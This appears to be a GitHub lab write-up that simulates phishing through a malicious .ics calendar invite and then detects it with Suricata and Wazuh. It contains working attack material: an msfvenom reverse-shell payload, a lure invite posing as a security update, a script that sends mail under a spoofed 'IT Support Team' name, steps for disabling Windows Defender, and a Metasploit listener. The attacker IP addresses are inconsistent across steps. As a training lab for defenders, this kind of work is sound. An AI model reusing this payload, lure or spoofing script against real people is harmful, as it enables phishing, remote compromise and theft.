# 🛡️Google-Calendar-Phishing-Attack-Suricata-and-Wazuh-Detection-Project
This project replicates a phishing attack using a malicious **.ics** calendar invite that delivers a reverse shell payload, and shows how to detect this attack using **Suricata** (an IDS) and **Wazuh** (a SIEM platform). This simulation is inspired by real-world techniques that abuse trusted calendar systems like Google Calendar for malware delivery and **command-and-control (C2)** communication.

---
## 🧪 Objective

•	Simulate a realistic phishing attack using .ics calendar invites.

•	Host a malicious payload and gain a reverse shell on the victim.

•	Detect C2 traffic and payload access using Suricata.

•	Monitor and analyze system behavior using Wazuh.

---

## 📌 Lab Setup

- Use **Briged Adapter** (or Internal Network) for both VMs:
  - Go to: *VirtualBox → Settings → Network*
  - Set `Adapter 1` → `Enable Network Adapter`
  - Attached to: **Briged Adapter**
  - Adapter Type: `Intel PRO/1000 MT Desktop`

Repeat the same for **Windows VM**.

| **Component** | **Role** | **OS* | **Notes** |
|---------------|-------------|---------------|-------------|
| **Attacker**  | Ubuntu VM (Kali Linux can also be used) | **Ubuntu 24.04.2**  | Runs sendmail, hosts payload, sends phishing email |
| **Victim**    | Windows 10 VM with Wazuh Agent installed | **Windows 10**   | Opens .ics invite and executes payload |
| **Network**   | Bridged Mode (same subnet for both VMs) | **Network**   |Allows both VMs to share network with host |
| **IDS**   | Suricata | **On Ubuntu**   | Detects C2 traffic from payload |

## 📸🌐Ubuntu Network Config
![Ubuntu_network](https://github.com/user-attachments/assets/d7b14041-237f-4890-b78e-6f38af0a5596)

## 📸🌐Windows 10 Network Config
![windows 10 network](https://github.com/user-attachments/assets/d1c0d41c-61b2-4159-aa04-b044fee20eb6)

---

## ✅Phase 1: Setup and File Hosting on /Ubuntu VM
### 🎯Goal
Generate a reverse shell payload to be delivered via phishing.
#### 🛠️1.1 Generate Payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe > newpayload.exe
```
  - LHOST = Attacker VM's IP
  - LPORT = Port for listener (ensure firewall allows it)
    
**Replace LHOST with your Ubuntu attacker's IP address.**

**Check the Payload File:**
```bash
ls -lh newpayload.exe
```

**Move the payload to the Apache web root:**
```bash
sudo mv newpayload.exe /var/www/html/
```
**Set correct permissions (optional but good)**
```bash
sudo chmod 755 /var/www/html/newpayload.exe
```
**Start Apache web server:**
```bash
sudo systemctl start apache2
```
Now payload is at:
http://192.168.56.107/newpayload.exe

## 🧠 Why?
This step simulates malware hosted on an attacker-controlled server. It's a common initial access vector in phishing attacks.

---

## Phase 2: 📆Create Malicious Calendar Invite (.ics)
The ICS file is a standard format used by calendar apps like Outlook, Thunderbird, and Google Calendar. In this attack, the .ics file is weaponized with a malicious URL in the DESCRIPTION and LOCATION fields.

Create a file named **malicious_invite.ics**:
```bash
nano malicious_invite.ics
```
Paste this content:
```bash
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//hacksw/handcal//NONSGML v1.0//EN
BEGIN:VEVENT
UID:20250606T120000Z-123456@example.com
DTSTAMP:20250606T120000Z
DTSTART:20250606T130000Z
DTEND:20250606T133000Z
SUMMARY:Urgent Security Update
DESCRIPTION:Please click this link to install the security patch:\n\nhttp://192.168.0.107/newpayload.exe
LOCATION:http://192.168.0.107/newpayload.exe
END:VEVENT
END:VCALENDAR
```
Save and Exit:
  - Press Ctrl + O to save.
  - Press Enter to confirm.
  - Press Ctrl + X to exit.
  
Why it works: Many email clients render .ics files directly as invitations, often auto-parsing the DESCRIPTION into clickable links.

---

## Phase 3: 📧 Send Phishing Email (from Ubuntu)
**We need a Python script that sends an email with a proper calendar invite .ics attachment, including a friendly sender name, via Gmail SMTP.**

What you need before running:
  - Python 3 installed
  - smtplib and email modules (built-in, no install needed)
  - Gmail App Password if your account has 2FA enabled (recommended)
  - Your .ics file ready

    
### Python script to send .ics invite with friendly sender name
#### 📁 Save the .py File
```bash
nano send_calendar_invite.py
```
Copy And Paste this Script
```bash
import smtplib
from email.message import EmailMessage
from email.utils import formataddr

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# Your Gmail credentials (use App Password if 2FA enabled)
GMAIL_USER = 'your_gmail_address'
GMAIL_PASS = 'your_app_password_here'  # Replace with your app password

FROM_NAME = 'IT Support Team'
FROM_EMAIL = 'itsupport@example.com'
TO_EMAIL = 'victim_mail_address'
SUBJECT = 'Urgent Security Update Required'

with open('malicious_invite.ics', 'r') as f:
    ics_content = f.read()

msg = EmailMessage()
msg['Subject'] = SUBJECT
msg['From'] = formataddr((FROM_NAME, FROM_EMAIL))
msg['To'] = TO_EMAIL

msg.set_content("""\
Dear User,

Please find the attached calendar invite for the mandatory security update.

Best Regards,
IT Support Team
""")

msg.add_attachment(
    ics_content.encode('utf-8'),
    maintype='text',
    subtype='calendar',
    filename='malicious_invite',
    disposition='attachment',
    headers=['Content-Class: urn:content-classes:calendarmessage']
)

try:
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(GMAIL_USER, GMAIL_PASS)
    server.send_message(msg)
    print("Email sent successfully!")
except Exception as e:
    print("Failed to send email:", e)
finally:
    server.quit()
```
### How to use:
  - Save this as send_calendar_invite.py in the same folder as your malicious_invite.ics.
  - Run the script with:
```bash
python3 send_calendar_invite.py
```

## 📸Email sent successfully
![Email sent successfully](https://github.com/user-attachments/assets/939a550e-3469-490b-9be5-81915e818421)

---

## 🧪Phase 4: Execute the Attack
### 1. On the Windows VM (Victim):
Steps:
1.Open Email Client:
  - Log in to the victim’s email account configured to receive the phishing email.
  - Locate the email with subject "Urgent Security Update Required" in the inbox.
2. Open Received Email:
  - Open the phishing email.
  - Download and open the attached calendar invite file named malicious_invite.ics.
3. Open the Attached Calendar Invite:
  - Open the .ics file. The invite should show the event titled "Urgent Security Update".
  - Click the link inside the calendar invite (http://192.168.0.107/newpayload.exe) to download the payload executable.
4. Disable Windows Defender Temporarily:
**Note: Windows Defender may block the payload download or execution. To bypass this in the lab environment, disable real-time protection temporarily via the registry:**
  - Press Win + R, type regedit, and press Enter to open Registry Editor.
    
```bash
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
```
  - If the key DisableAntiSpyware does not exist, create a new DWORD (32-bit) value named DisableAntiSpyware.
  - Set the value of DisableAntiSpyware to 1.
  - Restart the victim machine or restart Windows Defender services for the change to take effect.
Alternatively, you can disable Windows Defender real-time protection temporarily via the Settings app:
  - Go to Settings > Update & Security > Windows Security > Virus & threat protection > Manage settings.
  - Turn off Real-time protection (remember to turn it back on after testing).
5. Run the Downloaded Payload:
  - Locate the downloaded file newpayload.exe (usually in the Downloads folder).
  - Double-click to execute it.
  - This should open a reverse shell session back to the attacker.
  
## 📸PayLoad
![payload path](https://github.com/user-attachments/assets/6a4fd379-efb9-40c1-8486-da1f09776665)

### 2.Setting Up a Reverse Shell Listener Using Metasploit:
Once the phishing email has been sent and the victim downloads and executes the malicious payload (newpayload.exe), the attacker needs a way to receive the incoming reverse shell connection. This is done using the Metasploit Framework’s multi/handler module.

## 🛠️ Purpose of This Step:
  - To prepare the attacker’s system (Ubuntu/Kali VM) to listen for an incoming connection from the victim.
  - To establish a Meterpreter session once the payload is executed on the Windows 10 machine.

## ⚙️ Tools Used:

## 1.Start Metasploit Listener:
```bash
msfconsole
```
This opens the interactive Metasploit shell.

## 2. Use the Multi-Handler Module
This module is used to handle incoming connections from payloads, especially reverse shells:

```bash
use exploit/multi/handler
```
## 3. Configure the Payload
Specify the same payload type that was used while creating newpayload.exe with msfvenom:
```bash
set payload windows/meterpreter/reverse_tcp
```
## 4.Set the Local Host (LHOST)
This is the IP address of the attacker machine (Ubuntu VM):
```bash
set LHOST 192.168.56.101
```
 🔁 **Replace 192.168.56.101 with the actual IP address of your attacker machine.**
 
## 5. Set the Listening Port (LPORT)
This should match the port specified during payload creation:
```bash
set LPORT 4444
```
## 6. Launch the Listener
Start the listener to wait for the reverse shell:
```bash
exploit
```
Once executed, Metasploit will begin listening on the specified port (4444) and wait for the victim’s system to connect back.

## 📸Connection Established
![exploition](https://github.com/user-attachments/assets/f0649010-74bd-4f4a-a799-2276c69c725c)

![UID](https://github.com/user-attachments/assets/27703320-b732-432d-afb3-d438e26ee3a5)

---

## 🔍 Phase 5: Wazuh Host Monitoring

🎯 Goal: Detect suspicious host behavior from the victim's machine.
Steps:
•	Install Wazuh Agent on Windows 10.
•	Set the manager IP to Ubuntu host.
•	Start Wazuh agent service.
•	View alerts in Wazuh dashboard or log files.

## 📸Wazuh Agent
![Wazuh Agent](https://github.com/user-attachments/assets/2f24a328-33d2-497e-bacf-e5cffdd6937f)

---

## 🔍 Phase 6: Detecting the Attack with Suricata
### 1.Create Custom Suricata Rules
1.Edit local.rules File:
```bash
sudo nano /etc/suricata/rules/local.rules
```
2.Add the Following Rules:
```bash
alert http any any -> any any (msg:"Malicious Payload Accessed"; content:"/newpayload.exe"; http_uri; sid:1000001; rev:1;)
alert tcp any any -> any 4444 (msg:"Possible Reverse Shell Connection"; sid:1000002; rev:1;)
```
3.Save and Exit:
  -Press Ctrl + O to save.
  -Press Enter to confirm.
  -Press Ctrl + X to exit.
  
## 📸local.rules File
  ![local rules](https://github.com/user-attachments/assets/472dec1c-85a6-4359-8800-259c0285bb94)

### Edit Suricata config to load local.rules
Open the Suricata configuration file:
```bash
sudo nano /etc/suricata/suricata.yaml
```
Search for the **rule-files**: section (press Ctrl+W then type rule-files:)
Modify it like this (if not already present):

```bash
rule-files:
  - local.rules
```
-Make sure this block is under the default-rule-path: section like below:
```bash
default-rule-path: /etc/suricata/rules
rule-files:
  - local.rules
```
## 📸local.rules Path
![local rules path](https://github.com/user-attachments/assets/572c484a-ac49-482a-a003-c13e84e53670)

### Test the Suricata configuration
```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -v
```
You should see configuration OK. If not, check for spacing/indentation errors in YAML.

### Restart Suricata
```bash
sudo systemctl restart suricata
```
 ### Verify rule hits
 ```bash
sudo tail -f /var/log/suricata/fast.log
```
When victim downloads the payload, Suricata triggers the alert.

![alert](https://github.com/user-attachments/assets/8c022e3a-f4bc-49e3-9e1b-a92a7c0b9915)

---

✅ Insight:
This alert confirms that Suricata successfully identified a suspicious outbound TCP connection pattern often associated with reverse shells. This detection helps in identifying early stages of post-exploitation or command-and-control (C2) activity in a compromised environment.


________________________________________
✅ Final Outcome
•	📨 Email with .ics invite sent to victim
•	📅 Victim clicks calendar link
•	🐚 Reverse shell gained on attacker
•	📡 Wazuh logs system behavior
•	🚨 Suricata detects suspicious traffic

________________________________________
📚 Credits
Inspired by real-world phishing detection cases and lab simulation techniques.
________________________________________
🔐 Disclaimer
This project is for educational and ethical testing purposes only. Never test on unauthorized systems.




